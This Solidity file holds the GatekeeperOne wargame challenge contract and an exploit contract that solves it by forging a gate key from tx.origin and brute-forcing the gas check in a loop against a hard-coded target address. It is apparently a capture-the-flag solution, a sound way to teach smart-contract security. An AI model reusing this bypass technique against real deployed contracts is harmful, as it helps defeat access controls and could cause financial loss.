// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    //Task: Make it past the gatekeeper and register as an entrant
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(bytes8 _gateKey)
        public
        gateOne
        gateTwo
        gateThree(_gateKey)
        returns (bool)
    {
        entrant = tx.origin;
        return true;
    }
}

contract Hack {
    GatekeeperOne private immutable target =
        GatekeeperOne(0x0Ee33A103D7cA16422eF6242FF4abfe339a67E95);

    function _generateKey() private view returns (bytes8 _key) {
        uint256 startNumber = 2**32; // 4294967296 = 0 in both uint16 and uint32
        _key = bytes8(
            abi.encodePacked(
                uint64(startNumber) + uint64(uint16(uint160(tx.origin)))
            )
        );
    }

    function attack() external {
        bytes8 _gateKey = _generateKey();
        for (uint256 i; i <= 8191; i++) {
            try target.enter{gas: 81910 + i}(_gateKey) returns (bool status) {
                if (status) {
                    break;
                }
            } catch {}
        }
    }
}
